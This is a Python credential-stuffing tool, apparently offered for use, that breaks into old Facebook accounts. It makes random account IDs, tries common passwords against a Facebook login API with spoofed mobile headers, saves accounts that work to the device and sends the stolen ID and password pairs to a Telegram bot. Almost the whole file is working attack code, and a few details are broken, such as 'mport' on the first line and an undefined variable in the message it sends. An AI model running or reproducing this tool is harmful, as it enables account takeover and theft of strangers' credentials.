mport os,requests,sys,time,datetime
now = datetime.datetime.today()
an = datetime.datetime.now()
an2 = datetime.datetime(2026,4,17)
hours = (now.hour)
if an > an2 or an == an2:
 print('\033[1;31mThe Date : '+ str(an))
 print('\033[1;31mThe Exp Date : '+ str(an2))
 time.sleep(1)
 clock_emoji = ['🕛', '🕐', '🕑', '🕒', '🕓', '🕔', '🕕', '🕖', '🕗', '🕘', '🕙', '🕚']
 exit(0)

#</ Programmed | @SF7SF0
from concurrent.futures import ThreadPoolExecutor as tred
import requests,sys
from os import system as cmd
from random import randint as rr
from random import choice as rc
from string import digits as digits
import requests
import os
import re
import sys
import random
import string
import time
from os import system as ARAFAT
from os import system as shell
from rich import print
from rich import print_json
from rich import pretty
from rich.progress import track
from rich.markdown import Markdown
from rich.tree import Tree
from rich.panel import Panel
t=input (f'password : ' )
jss='SF' 
if jss ==t:
 pas='t'
 print('  ')
else:
 print('  ')
 exit('\x1b[38;5;196m حقوق SF')
print('\n')



print('''        _   _   _   _     _   _   _   _   _   _
       / \ / \ / \ / \   / \ / \ / \ / \ / \ / \ \

      ░██████╗███████╗
██╔════╝██╔════╝
╚█████╗░█████╗░░
░╚═══██╗██╔══╝░░
██████╔╝██║░░░░░
╚═════╝░╚═╝░░░░░
       \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/\n''');print('  ادخل توكن بوتك');token = input('[⊰⊱]  TOKEN : ')
print('  ادخل ايدي بوتك');ID=input('[⊰⊱]  ID : ');rd = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text= نورت اداه @SF7SF0').text

def linex():print(Panel("            [yellow bold]           SF ADeveloper  "))

logo =("""    

 """)
linex()
loop,ok=0,0
class Arafat:
    def __init__(self) -> None:
      self.sex=""
    def main(self):
       self.clear()
       
       linex()
       print(Panel("[cyan bold][✓] 1 𝗢𝗜𝗗 𝗖𝗜𝗢𝗡𝗘 2009-2014  \n[red bold][✘] 2 𝗘𝗫i𝗧 𝗠𝗘𝗡𝗨pp"));linex()
       self.frsc=input("\033[0;33m~>> chose : ")
       if self.frsc == "1":self.settings()
       else:main(self)
    def clear(self):cmd("clear");print(logo)
    def settings(self):
       self.clear();print(Panel("~>> Example : 10000   50000   1000000 "));linex()
       self.limit=int(input("\033[0;33m~>> Enter Search Limit : "));self.user=[]
       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(10));self.user.append(nmp)
       with tred(max_workers=30) as arafat:
           total=str(len(self.user));self.clear()
           linex()
           print("[✓] TOTAL ID : %s"%(total))
           print('[✓] PASSWORD : 123456 + 123456789')
           print("[✓] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE ");linex()
           for xd in self.user:
               uid=str("10000"+xd);pas=['mmaadd@@','123456789']
               arafat.submit(self.cracker,uid,pas,total)
               
       print();linex();print("~>> Cracking Complete \n~>> Total OK : %s"%(ok))
       linex();input("~>> Prees Enter To Exit ");exit()
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r\033[0;32m~>>  SF SF ✌🏽🔥 ~>> %s ~>> OK ~>>✅ %s SF SF acoont facr ✅ \r"%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              with requests.Session() as session:
                 headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': self.ua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
              po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
              if "Please Confirm Email" in str(po):
                 print(Panel(f"\r\r~>> OK ~>> [green bold]{uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Arafat-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1;tlg = f'''      
        ❲ OK - شغال ✅
 𝐇𝐈 𝐀𝐂𝐂𝐎𝐍𝐓 𝐅𝐀𝐂𝐄 𝐇𝐑𝐁𝐄
 —————————————
 اجاك حساب فيس من @SF7SF0 🔥
𝐈𝐃 {uid}

𝗣𝗔𝗦𝗦𝗢𝗥𝗗 {SF}
┤❲ المبرمج ❳ > @SF7SF0
—————————————
''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
                 break
              elif "session_key" in po:
                 print(Panel(f"\r\r~>> OK ~>>[green bold] {uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/Arafat-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1;tlg = f'''        ❲ OK - شغال ✅
 𝐇𝐈 𝐀𝐂𝐂𝐎𝐍𝐓 𝐅𝐀𝐂𝐄 𝐇𝐑𝐁𝐄
 —————————————
 اجاك حساب فيس من @SF7SF0 🔥
𝐈𝐃 {uid}

𝗣𝗔𝗦𝗦𝗢𝗥𝗗 {SF}
┤❲ المبرمج ❳ > @SF7SF0
—————————————''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
                 break
              else:pass
          loop+=1
       except Exception as e:pass
    def ua(self):
       aa = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
       return aa       
Arafat().main()